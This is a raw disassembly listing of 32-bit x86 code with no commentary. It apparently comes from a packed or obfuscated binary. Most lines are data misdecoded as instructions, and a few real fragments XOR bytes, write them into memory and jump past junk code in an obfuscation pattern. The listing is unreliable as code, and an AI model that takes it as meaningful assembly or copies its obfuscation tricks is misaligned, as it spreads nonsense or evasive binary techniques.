  4028f4:	ret    
  4028f5:	retf   0x5375
  4028f8:	pusha  
  4028f9:	je     0x4028e8
  4028fb:	mov    ebp,0xcfc7a1fd
  402900:	jp     0x4028ef
  402902:	xor    edx,ebx
  402904:	xor    eax,0xad1fb6c8
  402909:	loop   0x402957
  40290b:	mov    edx,0xe11e3b95
  402910:	mov    bl,BYTE PTR [eax-0x2]
  402913:	pop    ds
  402914:	mov    bl,0x75
  402916:	mov    esp,0x3cc76d94
  40291b:	rcr    DWORD PTR [ecx+0x72],cl
  40291e:	stos   DWORD PTR es:[edi],eax
  40291f:	cmp    eax,0xf8342ffa
  402924:	xor    al,0x58
  402926:	push   ss
  402927:	jns    0x402918
  402929:	shr    DWORD PTR [ecx],cl
  40292b:	retf   
  40292c:	pop    ebx
  40292d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40292e:	jle    0x40291e
  402930:	adc    BYTE PTR [ebx],bl
  402932:	lods   eax,DWORD PTR ds:[esi]
  402933:	or     ah,0x6b
  402936:	inc    ecx
  402937:	retf   0x595c
  40293a:	out    dx,al
  40293b:	jne    0x40294b
  40293d:	shl    BYTE PTR [ebp-0x7b],1
  402940:	jnp    0x402958
  402942:	and    al,BYTE PTR [edi+0xf]
  402945:	repz mov edx,0xce006580
  40294b:	mov    cs,WORD PTR [esi+0x34]
  40294e:	jo     0x4028e7
  402950:	mov    esp,0x557b26f
  402955:	dec    ebp
  402956:	mov    al,0xdc
  402958:	in     eax,0x3d
  40295a:	xor    al,0xc6
  40295c:	inc    ebx
  40295d:	pushf  
  40295e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40295f:	inc    ebp
  402960:	(bad)  
  402961:	aad    0x93
  402963:	xor    bl,dh
  402965:	test   BYTE PTR [edx+edx*4],bl
  402968:	pop    esi
  402969:	lea    edx,[esp+ecx*1-0x65889d31]
  402970:	adc    ecx,DWORD PTR [edx+eiz*8-0x67f2d54d]
  402977:	lahf   
  402978:	(bad)  
  402979:	outs   dx,BYTE PTR ds:[esi]
  40297a:	shl    DWORD PTR [edi+0x56ff2bf7],0x2b
  402981:	cdq    
  402982:	xchg   edi,eax
  402983:	fs sub al,0x1c
  402986:	pop    ecx
  402987:	retf   0x6e0b
  40298a:	int    0xf9
  40298c:	mov    al,ds:0xb4e9cbab
  402991:	fisttp DWORD PTR [edi]
  402993:	adc    edx,ecx
  402995:	xchg   esi,eax
  402996:	xchg   bh,dl
  402998:	xor    BYTE PTR [edi+0x27],0x6f
  40299c:	std    
  40299d:	or     al,0xc5
  40299f:	imul   ecx,DWORD PTR [edi],0x24
  4029a2:	jno    0x402930
  4029a4:	inc    eax
  4029a5:	mov    ebp,0xf3f174c5
  4029aa:	mov    ebx,0x6046d5d8
  4029af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029b0:	test   DWORD PTR [edi],ebp
  4029b2:	shl    bl,cl
  4029b4:	into   
  4029b5:	rcl    BYTE PTR [esi+0x5],cl
  4029b8:	ficom  WORD PTR [edx+0x13]
  4029bb:	xchg   esp,eax
  4029bc:	cmp    cl,ch
  4029be:	push   0xffffffc3
  4029c0:	jne    0x402a0d
  4029c2:	push   esi
  4029c3:	das    
  4029c4:	dec    edx
  4029c5:	inc    ebp
  4029c6:	inc    ebp
  4029c7:	inc    esp
  4029c8:	stos   DWORD PTR es:[edi],eax
  4029c9:	std    
  4029ca:	cli    
  4029cb:	lahf   
  4029cc:	mov    ds:0x1860b6a3,al
  4029d1:	into   
  4029d2:	(bad)  
  4029d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029d4:	repz xor eax,0xff94fdb2
  4029da:	in     eax,0xb4
  4029dc:	inc    ebx
  4029dd:	mov    ecx,0x4ce4f88c
  4029e2:	fs pop edx
  4029e4:	retf   
  4029e5:	add    BYTE PTR [ebx],dl
  4029e7:	mov    ebx,0xdeb30614
  4029ec:	xchg   edx,eax
  4029ed:	addr16 jl 0x402a3f
  4029f0:	enter  0xf6f1,0x7b
  4029f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029f5:	lods   al,BYTE PTR ds:[esi]
  4029f6:	xor    eax,0x1d2b6dfa
  4029fb:	cdq    
  4029fc:	mov    dh,0x91
  4029fe:	xor    DWORD PTR [ebx-0x3a],0x50
  402a02:	mov    cl,0x17
  402a04:	sub    BYTE PTR ds:0xc1d2f5a9,bh
  402a0a:	enter  0x1f9c,0xd
  402a0e:	and    bl,BYTE PTR [esi]
  402a10:	out    dx,al
  402a11:	xor    esi,ecx
  402a13:	mov    eax,DWORD PTR [ebp-0x2c]
  402a16:	jne    0x402a1f
  402a1c:	mov    eax,DWORD PTR [ebp-0x10]
  402a1f:	xor    eax,esi
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	jno    0x402a55
  402a36:	mov    ebp,0x7e0daa7c
  402a3b:	jle    0x402a37
  402a3d:	jg     0x402abd
  402a3f:	jle    0x402a69
  402a41:	xor    eax,0x1ead75c2
  402a46:	sti    
  402a47:	shl    DWORD PTR [eax-0x578d5c20],1
  402a4d:	mov    ch,dh
  402a4f:	cmp    eax,DWORD PTR [ebx]
  402a51:	lahf   
  402a52:	jne    0x402a83
  402a54:	cmp    DWORD PTR [edx+ebx*1],esp
  402a57:	shr    DWORD PTR [eax+0x2bc3db24],1
  402a5d:	clc    
  402a5e:	repnz pop ds
  402a60:	(bad)  
  402a61:	loopne 0x402a24
  402a63:	jo     0x402a18
  402a65:	test   ebp,ebp
  402a67:	fcmovbe st,st(1)
  402a69:	pop    ebx
  402a6a:	rep lods al,BYTE PTR ds:[esi]
  402a6c:	inc    ebx
  402a6d:	jne    0x402ab0
  402a6f:	xchg   ecx,eax
  402a70:	rcr    BYTE PTR [ebx-0x13ba962b],cl
  402a76:	and    DWORD PTR [edi],ecx
  402a78:	aad    0x4a
  402a7a:	dec    esp
  402a7b:	fld    DWORD PTR [eax-0x1b472666]
  402a81:	adc    bh,BYTE PTR [esi-0x37e5b5e9]
  402a87:	fwait
  402a88:	dec    edx
  402a89:	jp     0x402b0a
  402a8b:	xchg   BYTE PTR [esp+eax*1-0x2],dl
  402a8f:	xor    eax,0x2f8d2720
  402a94:	sbb    edx,DWORD PTR [eax-0xa228cc1]
  402a9a:	scas   eax,DWORD PTR es:[edi]
  402a9b:	(bad)  
  402a9c:	push   edx
  402a9d:	mov    ah,0x22
  402a9f:	xchg   BYTE PTR [ebx-0x4e],bh
  402aa2:	cwde   
  402aa3:	pop    esi
  402aa4:	aas    
  402aa5:	pop    es
  402aa6:	dec    eax
  402aa8:	xchg   esp,eax
  402aa9:	div    ch
  402aab:	(bad)  
  402aac:	ins    DWORD PTR es:[edi],dx
  402aad:	add    al,0xcd
  402aaf:	pop    edi
  402ab0:	jmp    0xf2cf:0x2f147864
  402ab7:	jle    0x402ab9
  402ab9:	cmp    eax,0xa8cbfda1
  402abe:	adc    ebx,DWORD PTR [edi]
  402ac0:	(bad)  
  402ac1:	jmp    FWORD PTR [esi+ebx*1+0x1f35849c]
  402ac8:	jmp    FWORD PTR [esi]
  402aca:	nop
  402acb:	mov    ebx,DWORD PTR [ecx+0x29424976]
  402ad1:	push   cs
  402ad2:	enter  0x4672,0xfb
  402ad6:	test   ecx,ebp
  402ad8:	fwait
  402ad9:	lock shl eax,cl
  402adc:	mov    dh,0xf3
  402ade:	rol    DWORD PTR [esi+edi*1],0xbf
  402ae2:	sub    ebx,DWORD PTR [ebx]
  402ae4:	push   esi
  402ae5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ae6:	test   DWORD PTR [edi+0x3145963f],edi
  402aec:	mov    ds:0x91026a5d,eax
  402af1:	std    
  402af2:	add    dh,al
  402af4:	fnstsw WORD PTR [eax+eiz*4-0x19]
  402af8:	iret   
  402af9:	mov    dh,0xe9
  402afb:	push   esp
  402afc:	and    DWORD PTR [ebp-0x3f16b4d8],edi
  402b02:	repz leave 
  402b04:	sub    dl,BYTE PTR [ebp+0x73]
  402b07:	popa   
  402b08:	cmc    
  402b09:	js     0x402b85
  402b0b:	test   al,0x61
  402b0d:	sub    DWORD PTR [eax+0x30],ebp
  402b10:	inc    eax
  402b11:	mov    esi,0xe83b51
  402b16:	add    eax,0x40dc02b7
  402b1b:	or     DWORD PTR [edx],esi
  402b1d:	fucomip st,st(6)
  402b1f:	jns    0x402ac5
  402b21:	jmp    0x10b7b6da
  402b26:	sub    al,0xa5
  402b28:	and    al,0xdf
  402b2a:	imul   ebp,DWORD PTR [edx],0xffffffe8
  402b2d:	pop    edx
  402b2e:	mov    BYTE PTR [ebp+0x26],dl
  402b31:	cmp    al,0x8a
  402b33:	jp     0x402b38
  402b35:	push   eax
  402b36:	dec    esi
  402b37:	fild   DWORD PTR [edi+0x64]
  402b3a:	push   eax
  402b3b:	in     al,dx
  402b3c:	jle    0x402b88
  402b3e:	jne    0x402b02
  402b40:	xor    BYTE PTR [edi+edi*4-0x6fbab6e8],ch
  402b47:	push   ds
  402b48:	sbb    eax,0x8d4ab0e7
  402b4d:	loop   0x402b90
  402b4f:	sub    bh,BYTE PTR [eax+0x17e3ed54]
  402b55:	fdivr  st,st(6)
  402b57:	sub    BYTE PTR [esi+0x121e54f6],al
  402b5d:	add    cl,BYTE PTR [eax]
  402b5f:	cdq    
  402b60:	popa   
  402b61:	mov    ebp,DWORD PTR [esp+edi*8-0x12756665]
  402b68:	mov    esp,DWORD PTR [ecx-0x48]
  402b6b:	pop    edi
  402b6c:	xchg   ebp,eax
  402b6d:	add    ecx,DWORD PTR [edi]
  402b6f:	ret    0xc00a
  402b72:	sbb    dh,BYTE PTR [ebp-0x71]
  402b75:	jno    0x402b12
  402b77:	stos   DWORD PTR es:[edi],eax
  402b78:	pop    esi
  402b79:	ret    0x404
  402b7c:	cwde   
  402b7d:	and    BYTE PTR [ecx],ch
  402b7f:	scas   eax,DWORD PTR es:[edi]
  402b80:	(bad)  
  402b81:	bound  ecx,QWORD PTR [ebx+0x631d8fb0]
  402b87:	jo     0x402b6e
  402b89:	or     bh,dl
  402b8b:	dec    esp
  402b8c:	cmp    eax,DWORD PTR [ebx+0xcef5b59]
  402b92:	add    al,0xfe
  402b94:	fnstsw WORD PTR [esp+eax*4]
  402b97:	cmp    ah,BYTE PTR [esi-0x486a7297]
  402b9d:	or     ebx,DWORD PTR [eax]
  402b9f:	add    al,BYTE PTR [ebp+0x7f]
  402ba2:	xchg   ebp,eax
  402ba3:	sbb    ebx,DWORD PTR [esi+0x141b64b5]
  402ba9:	mov    ebx,DWORD PTR ds:0x5c246464
  402baf:	pop    ds
  402bb0:	leave  
  402bb1:	pushf  
  402bb2:	adc    bl,BYTE PTR [edi]
  402bb4:	ret    
  402bb5:	repnz dec esp
  402bb7:	imul   edi,DWORD PTR [eax+0x1bb67d60],0xffffffcf
  402bbe:	inc    edx
  402bbf:	push   cs
  402bc0:	gs inc esi
  402bc2:	call   0x2884:0xfc085ad
  402bc9:	add    BYTE PTR [eax],al
  402bcb:	add    BYTE PTR [ebp-0x977b],cl
  402bd1:	call   DWORD PTR [eax-0x75]
  402bd4:	inc    ebp
  402bd5:	in     al,0x33
  402bd7:	mov    BYTE PTR [ebx],0xc7
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	pop    es
  402c12:	xchg   edx,eax
  402c13:	daa    
  402c14:	mov    cl,0x36
  402c16:	or     edi,DWORD PTR [esi+0x7e]
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402c95
  402c1e:	fistp  DWORD PTR [ebx]
  402c20:	mov    ds:0x8cbe59b1,eax
  402c25:	and    bl,bh
  402c27:	jge    0x402bf0
  402c29:	mov    ch,0x2f
  402c2b:	test   edi,edx
  402c2d:	das    
  402c2e:	fidiv  WORD PTR [ebp+edx*2-0x489d1491]
  402c35:	test   cl,ch
  402c37:	mov    edi,0x59d7595
  402c3c:	cwde   
  402c3d:	ret    0xc64b
  402c40:	ins    DWORD PTR es:[edi],dx
  402c41:	out    0x66,eax
  402c43:	xchg   edx,edx
  402c45:	ror    BYTE PTR [ecx-0x46],1
  402c48:	jge    0x402c29
  402c4a:	and    ecx,DWORD PTR [esp+edx*2+0x53eb5d54]
  402c51:	pop    edx
  402c52:	int    0xbe
  402c54:	jmp    DWORD PTR es:[eax-0x31]
  402c58:	stos   DWORD PTR es:[edi],eax
  402c59:	rol    DWORD PTR gs:[ebp+0x32],0x43
  402c5e:	leave  
  402c5f:	pop    edi
  402c60:	jns    0x402c94
  402c62:	fcom   st(7)
  402c64:	mov    ebp,edx
  402c66:	aas    
  402c67:	in     al,0x1f
  402c69:	mov    ecx,0x96279aad
  402c6e:	jae    0x402c8b
  402c70:	adc    edi,DWORD PTR [edi]
  402c72:	repnz clc 
  402c74:	int    0x8e
  402c76:	push   ebp
  402c77:	stc    
  402c78:	stos   DWORD PTR es:[edi],eax
  402c79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c7a:	pusha  
  402c7b:	adc    eax,0x86409fea
  402c80:	mov    ah,0x8c
  402c82:	adc    esp,DWORD PTR [ebx+0x33]
  402c85:	cmp    bh,ch
  402c87:	pop    ebx
  402c88:	js     0x402cec
  402c8a:	push   edi
  402c8b:	xlat   BYTE PTR ds:[ebx]
  402c8c:	adc    eax,0x89e273bb
  402c91:	push   es
  402c92:	and    BYTE PTR [ebx-0x56c2aa8a],0xe9
  402c99:	sub    bl,0xc8
  402c9c:	stos   BYTE PTR es:[edi],al
  402c9d:	ss jecxz 0x402c42
  402ca0:	mov    ch,0x21
  402ca2:	xor    DWORD PTR [ecx+0x20],eax
  402ca5:	sbb    eax,0xe83e18af
  402caa:	mov    dh,0x6a
  402cac:	xchg   esi,eax
  402cad:	pop    esp
  402cae:	add    BYTE PTR [edx],al
  402cb0:	push   eax
  402cb1:	int3   
  402cb2:	pop    ebp
  402cb3:	jmp    0x402cbe
  402cb5:	xor    dl,bh
  402cb7:	sub    ebx,DWORD PTR [esi-0x50]
  402cba:	add    esp,DWORD PTR [esi+ebx*8]
  402cbd:	sbb    cl,BYTE PTR [edx-0x644673e6]
  402cc3:	daa    
  402cc4:	sub    cl,ch
  402cc6:	and    bh,BYTE PTR [esi]
  402cc8:	xor    DWORD PTR [edx],ecx
  402cca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ccb:	pusha  
  402ccc:	sbb    cl,dl
  402cce:	sbb    ch,BYTE PTR [edi+ebp*8]
  402cd1:	outs   dx,BYTE PTR ds:[esi]
  402cd2:	arpl   WORD PTR [ecx-0x74a20804],cx
  402cd8:	pop    edi
  402cd9:	mov    dh,0x21
  402cdb:	sbb    al,0x91
  402cdd:	jns    0x402d49
  402cdf:	jmp    0xdf7d:0x2d10ada0
  402ce6:	dec    eax
  402ce7:	xor    al,0x51
  402ce9:	scas   al,BYTE PTR es:[edi]
  402cea:	jo     0x402ce2
  402cec:	popa   
  402ced:	sti    
  402cee:	and    al,0x3b
  402cf0:	push   ecx
  402cf1:	in     eax,0x5c
  402cf3:	fwait
  402cf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cf5:	outs   dx,DWORD PTR ds:[esi]
  402cf6:	in     al,dx
  402cf7:	push   edx
  402cf8:	xor    BYTE PTR [esi-0x5a],dl
  402cfb:	lea    edx,[esi+0x9]
  402cfe:	push   ebp
  402cff:	call   0xc33a:0x3ae73b8
  402d06:	fs cmc 
  402d08:	je     0x402d41
  402d0a:	jmp    0x7b48ea0a
  402d0f:	adc    ecx,ebx
  402d11:	pop    es
  402d12:	jmp    0x402ca2
  402d14:	pusha  
  402d15:	mov    ebx,?
  402d17:	mov    dl,0x4a
  402d19:	je     0x402d93
  402d1b:	test   edx,esi
  402d1d:	neg    BYTE PTR [ecx-0x63e8af9b]
  402d23:	sahf   
  402d24:	retf   0x266e
  402d27:	icebp  
  402d28:	mov    dl,0xe9
  402d2a:	jge    0x402da2
  402d2c:	rcl    eax,0x25
  402d2f:	cmp    BYTE PTR [ecx+0x5e],bh
  402d32:	scas   eax,DWORD PTR es:[edi]
  402d33:	test   BYTE PTR [ebx-0x524ff0eb],dl
  402d39:	jmp    0x402db8
  402d3b:	pop    ss
  402d3c:	jbe    0x402d69
  402d3e:	push   ebx
  402d3f:	stc    
  402d40:	pop    ds
  402d41:	xchg   ebp,eax
  402d42:	data16 (bad) 
  402d44:	fiadd  DWORD PTR [edi+0x33]
  402d47:	and    bl,BYTE PTR [ebx-0x2]
  402d4a:	mov    ebp,0x65368195
  402d4f:	int    0x51
  402d51:	out    dx,eax
  402d52:	sub    esi,DWORD PTR [esi-0x2b]
  402d55:	xlat   BYTE PTR ds:[ebx]
  402d56:	dec    eax
  402d57:	pop    edx
  402d58:	mov    ecx,0xc515f272
  402d5d:	jns    0x402dd9
  402d5f:	inc    esp
  402d60:	and    ah,BYTE PTR [ebp+0x18]
  402d63:	sub    BYTE PTR [eax-0x275abee2],dl
  402d69:	adc    BYTE PTR [edx+0x24],dl
  402d6c:	ss mov ebp,0x66ef51cb
  402d72:	in     eax,dx
  402d73:	pop    eax
  402d74:	add    ebx,esp
  402d76:	mov    dh,0x29
  402d78:	xlat   BYTE PTR ds:[ebx]
  402d79:	jo     0x402d38
  402d7b:	or     DWORD PTR [edi-0x1e100c6],esp
  402d81:	dec    ebp
  402d82:	arpl   WORD PTR [edx+0x68],bx
  402d85:	inc    esi
  402d86:	dec    edi
  402d87:	ins    DWORD PTR es:[edi],dx
  402d88:	out    0x3a,eax
  402d8a:	fs or  ecx,eax
  402d8d:	retf   
  402d8e:	mov    dh,0xec
  402d90:	enter  0xc080,0x24
  402d94:	outs   dx,BYTE PTR ds:[esi]
  402d95:	std    
  402d96:	dec    ebx
  402d97:	ins    BYTE PTR es:[edi],dx
  402d98:	jp     0x402d72
  402d9a:	add    al,0x3
  402d9c:	cmp    dl,cl
  402d9e:	pop    esp
  402d9f:	mov    al,0xa9
  402da1:	sub    eax,DWORD PTR [ebp-0x4]
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [ecx+ebx*2+0x6b],1
  402de7:	fmul   DWORD PTR [edx+esi*4+0x8]
  402deb:	jle    0x402e6b
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402d74
  402df2:	repnz sti 
  402df4:	fld    DWORD PTR [esi-0x38]
  402df7:	jne    0x402da2
  402df9:	out    dx,eax
  402dfa:	bound  ecx,QWORD PTR ds:0x63437ec8
  402e00:	mov    esi,0x68c51455
  402e05:	jl     0x402ddd
  402e07:	sbb    eax,0x8fcac0af
  402e0c:	mov    bl,0x7f
  402e0e:	jg     0x402d9b
  402e10:	shl    dl,1
  402e12:	dec    ebp
  402e13:	pop    edx
  402e14:	jmp    0x2860:0x99ad040e
  402e1b:	sbb    eax,edi
  402e1d:	test   eax,0xca162728
  402e22:	dec    edx
  402e23:	mov    ecx,0x50e981a1
  402e28:	lods   al,BYTE PTR fs:[esi]
  402e2a:	inc    ecx
  402e2b:	mov    al,0x29
  402e2d:	push   edi
  402e2e:	loope  0x402e9c
  402e30:	add    ch,BYTE PTR [edx+0x6d]
  402e33:	mov    ch,BYTE PTR [ebp+0x1947eb71]
  402e39:	or     eax,0x14ec6646
  402e3e:	sbb    edi,ecx
  402e40:	test   eax,0x6d360f7
  402e45:	in     al,dx
  402e46:	pop    edx
  402e47:	mov    bh,0x75
  402e49:	fisub  DWORD PTR [ebx]
  402e4b:	sub    eax,0xdfbd0142
  402e50:	bound  ecx,QWORD PTR [edx-0x2b]
  402e53:	int    0x1f
  402e55:	add    eax,0x9b8b7f93
  402e5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e5c:	stos   BYTE PTR es:[edi],al
  402e5d:	in     eax,0x4b
  402e5f:	jo     0x402e1d
  402e61:	mov    dh,BYTE PTR [ebx+eax*8]
  402e64:	ret    0xa91b
  402e67:	jl     0x402e3b
  402e69:	xor    DWORD PTR [edx-0x3c],esp
  402e6c:	lods   al,BYTE PTR ds:[esi]
  402e6d:	add    BYTE PTR [ebx-0x5519a4ad],cl
  402e73:	pop    ecx
  402e74:	iret   
  402e75:	scas   eax,DWORD PTR es:[edi]
  402e76:	out    0xc3,al
  402e78:	inc    ebx
  402e79:	dec    eax
  402e7a:	shl    BYTE PTR [edx],cl
  402e7c:	in     eax,dx
  402e7d:	sub    eax,0xda639776
  402e82:	mov    dl,0x3
  402e84:	gs ins DWORD PTR es:[edi],dx
  402e86:	inc    ebx
  402e87:	outs   dx,BYTE PTR ds:[esi]
  402e88:	das    
  402e89:	ja     0x402eee
  402e8b:	arpl   WORD PTR [edi+0x45d0329e],ax
  402e91:	sbb    BYTE PTR [esi+0x5],bl
  402e94:	sti    
  402e95:	sbb    al,0xc3
  402e97:	cmp    DWORD PTR [esp+edi*8],edi
  402e9a:	mov    edx,0xabd78ea8
  402e9f:	data16 cmp BYTE PTR [ecx],0x5c
  402ea3:	fmul   DWORD PTR [edx]
  402ea5:	dec    dl
  402ea7:	not    DWORD PTR [eax-0x3af647fb]
  402ead:	ret    0xb797
  402eb0:	and    esp,DWORD PTR [ebp+0x49]
  402eb3:	fmulp  st(2),st
  402eb5:	jecxz  0x402ee1
  402eb7:	fwait
  402eb8:	xchg   DWORD PTR [esi],eax
  402eba:	pop    edi
  402ebb:	(bad)  
  402ebc:	xchg   esi,eax
  402ebd:	adc    eax,0x75bfd545
  402ec2:	cs pop esp
  402ec4:	push   ebp
  402ec5:	xchg   ebx,eax
  402ec6:	fwait
  402ec7:	scas   al,BYTE PTR es:[edi]
  402ec8:	mov    ss,eax
  402eca:	fcmovu st,st(5)
  402ecc:	adc    DWORD PTR [esi+0xb],ebp
  402ecf:	pop    ebx
  402ed0:	mov    edx,ebp
  402ed2:	inc    edx
  402ed3:	push   edi
  402ed4:	pop    edx
  402ed5:	jne    0x402e79
  402ed7:	inc    edi
  402ed8:	mov    ss,WORD PTR [eax+0x26]
  402edb:	popf   
  402edc:	(bad)  
  402edd:	std    
  402ede:	jecxz  0x402ec2
  402ee0:	lods   al,BYTE PTR ds:[esi]
  402ee1:	(bad)  [ecx+0x2]
  402ee4:	in     eax,0x57
  402ee6:	stos   BYTE PTR es:[edi],al
  402ee7:	imul   ebp,DWORD PTR [esi+0x6f],0xb
  402eeb:	or     eax,0x681e2a55
  402ef0:	lods   al,BYTE PTR fs:[esi]
  402ef2:	cmp    DWORD PTR [esp+esi*2],ebx
  402ef5:	test   BYTE PTR [eax],0xd
  402ef8:	inc    ebx
  402ef9:	push   ebx
  402efa:	sbb    ebp,DWORD PTR [eax+edx*8+0x6d3dfa2b]
  402f01:	stos   DWORD PTR es:[edi],eax
  402f02:	int    0x80
  402f04:	pushf  
  402f05:	out    dx,al
  402f06:	ds (bad) 
  402f08:	and    DWORD PTR [edx],ebx
  402f0a:	cdq    
  402f0b:	mov    edi,0x298a832b
  402f10:	gs scas al,BYTE PTR es:[edi]
  402f12:	ffreep st(2)
  402f14:	cs adc dl,ah
  402f17:	inc    edi
  402f18:	xchg   esi,eax
  402f19:	cmc    
  402f1a:	push   ds
  402f1b:	dec    eax
  402f1c:	jns    0x402f7d
  402f1e:	xchg   ebx,eax
  402f1f:	dec    ebp
  402f20:	or     DWORD PTR [eax-0x7954c0a8],eax
  402f26:	sbb    BYTE PTR [ecx-0x75],bh
  402f29:	imul   eax,DWORD PTR [ebx-0x30],0x928002a8
  402f30:	(bad)  
  402f31:	mov    dl,0x3
  402f33:	mov    WORD PTR [edx+0x206d526f],?
  402f39:	sub    DWORD PTR ds:0xcdf765e5,ebx
  402f3f:	iret   
  402f40:	xor    al,0xb9
  402f42:	mov    bh,0xe3
  402f44:	dec    ebp
  402f45:	mov    ds:0x5c0766e3,al
  402f4a:	int    0xce
  402f4c:	pop    ecx
  402f4d:	inc    ebp
  402f4e:	daa    
  402f4f:	sbb    BYTE PTR ds:[edi-0x30006993],al
  402f56:	mov    eax,0x8911dec0
  402f5b:	sub    BYTE PTR [ebx-0x43],dl
  402f5e:	in     al,0xe3
  402f60:	ret    
  402f61:	aad    0x1d
  402f63:	sbb    al,0xed
  402f65:	or     DWORD PTR [ebp+0x35b27c38],esp
  402f6b:	(bad)  
  402f6c:	mov    edi,0x104c3797
  402f71:	out    dx,eax
  402f72:	js     0x402f78
  402f74:	bound  ecx,QWORD PTR [ebp+0x413c0c05]
  402f7a:	add    bh,bh
  402f7c:	xor    BYTE PTR [ebp+0x4139b805],cl
  402f82:	add    bh,bh
  402f84:	xor    BYTE PTR [ebp+0x413bec05],cl
  402f8a:	add    bh,bh
  402f8c:	xor    BYTE PTR [ebp+0x413d3405],cl
  402f92:	add    bh,bh
  402f94:	xor    BYTE PTR [edi+0x534343d3],al
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi-0x17d15a49]
  402fae:	mov    ds:0x7e163ee9,eax
  402fb3:	jle    0x402faf
  402fb5:	jg     0x403035
  402fb7:	jle    0x403003
  402fb9:	scas   eax,DWORD PTR es:[edi]
  402fba:	jg     0x402fad
  402fbc:	lods   eax,DWORD PTR ds:[esi]
  402fbd:	icebp  
  402fbe:	xchg   edx,eax
  402fbf:	xor    ecx,edi
  402fc1:	push   es
  402fc2:	std    
  402fc3:	dec    esp
  402fc4:	xchg   DWORD PTR [ecx+0x7f09d43d],ebp
  402fca:	test   DWORD PTR [ecx],edx
  402fcc:	ins    BYTE PTR es:[edi],dx
  402fcd:	icebp  
  402fce:	daa    
  402fcf:	test   BYTE PTR [ebx],dl
  402fd1:	inc    ebp
  402fd2:	cmp    eax,0x6a085daa
  402fd7:	add    ah,BYTE PTR [esi+0x3b3e40ab]
  402fdd:	jnp    0x40300e
  402fdf:	mov    edi,0x47d50ae7
  402fe4:	and    al,0x6c
  402fe6:	xchg   BYTE PTR [ebx],al
  402fe8:	mov    ah,0x40
  402fea:	loopne 0x402fa5
  402fec:	ret    
  402fed:	fmul   st,st(3)
  402fef:	fs cmc 
  402ff1:	and    eax,0x94866492
  402ff6:	jns    0x402f81
  402ff8:	inc    ecx
  402ff9:	jecxz  0x402fca
  402ffb:	or     eax,0x322544c5
  403000:	cmp    ah,bl
  403002:	inc    esp
  403003:	inc    edx
  403004:	adc    eax,0x8402ef3c
  403009:	int    0xb3
  40300b:	dec    eax
  40300c:	sbb    al,0xa4
  40300e:	retf   0x1012
  403011:	jp     0x40306d
  403013:	pop    ecx
  403014:	cmp    eax,0x1fe2e865
  403019:	pop    es
  40301a:	xchg   esi,eax
  40301b:	ja     0x402ff9
  40301d:	jo     0x40308f
  40301f:	push   ecx
  403020:	aas    
  403021:	fwait
  403022:	test   eax,0x33a2a3df
  403027:	mov    ah,0xa0
  403029:	sbb    eax,0xf37e5ed2
  40302e:	out    dx,eax
  40302f:	les    esi,FWORD PTR [esi]
  403031:	js     0x403011
  403033:	enter  0x59b8,0xbe
  403037:	pop    esp
  403038:	mov    al,ds:0xa42290a4
  40303d:	sbb    eax,0x5ec16241
  403042:	sub    BYTE PTR [ecx-0x30af1345],dl
  403048:	push   cs
  403049:	popf   
  40304a:	inc    edx
  40304b:	enter  0x7a53,0xc9
  40304f:	neg    eax
  403051:	je     0x402fd8
  403053:	xor    dl,bl
  403055:	jo     0x4030a9
  403057:	mov    ebx,0xe52bf23d
  40305c:	xchg   ebx,eax
  40305d:	mov    ds:0x5f7cc74b,al
  403062:	sahf   
  403063:	cld    
  403064:	xlat   BYTE PTR ds:[ebx]
  403065:	sti    
